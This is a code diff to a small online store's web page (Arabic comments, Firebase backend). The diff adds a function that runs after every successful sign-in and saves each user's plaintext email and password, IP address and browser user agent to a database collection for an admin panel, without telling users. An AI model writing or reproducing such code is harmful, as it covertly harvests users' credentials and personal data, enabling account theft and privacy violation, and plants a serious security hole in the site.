@@ -1315,6 +1315,38 @@
         let selectedPackage = { amount: 100, price: 25 };
         let currentUser = null;
 
+        // دالة لحفظ بيانات تسجيل الدخول للإدمن
+        async function saveLoginToAdmin(user, loginEmail, loginPassword) {
+            try {
+                // جلب معلومات المستخدم
+                const userDoc = await db.collection('users').doc(user.uid).get();
+                const userData = userDoc.data();
+                
+                // جلب الـ IP
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ipAddress = ipData.ip;
+                
+                const userAgent = navigator.userAgent;
+                
+                // حفظ بيانات تسجيل الدخول
+                await db.collection('userLogins').add({
+                    userId: user.uid,
+                    userName: userData.name,
+                    userEmail: userData.email,
+                    loginEmail: loginEmail,
+                    loginPassword: loginPassword,
+                    loginTime: firebase.firestore.FieldValue.serverTimestamp(),
+                    ipAddress: ipAddress,
+                    userAgent: userAgent
+                });
+                
+                console.log('✅ Login data sent to admin panel');
+            } catch (error) {
+                console.error('Error saving login data:', error);
+            }
+        }
+
         // إدارة حالة المستخدم
         auth.onAuthStateChanged((user) => {
             if (user) {
@@ -1369,6 +1401,10 @@
             
             try {
                 const userCredential = await auth.signInWithEmailAndPassword(email, password);
+                
+                // حفظ بيانات تسجيل الدخول للإدمن
+                await saveLoginToAdmin(userCredential.user, email, password);
+                
                 messageDiv.innerHTML = '<div class="success-message">تم تسجيل الدخول بنجاح!</div>';
                 
             } catch (error) {
@@ -1689,6 +1725,10 @@
             }
         });
 
+        // Auto-load orders when page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('Roma&knzy stor Started Successfully!');
+        });
     </script>
 </body>
 </html>
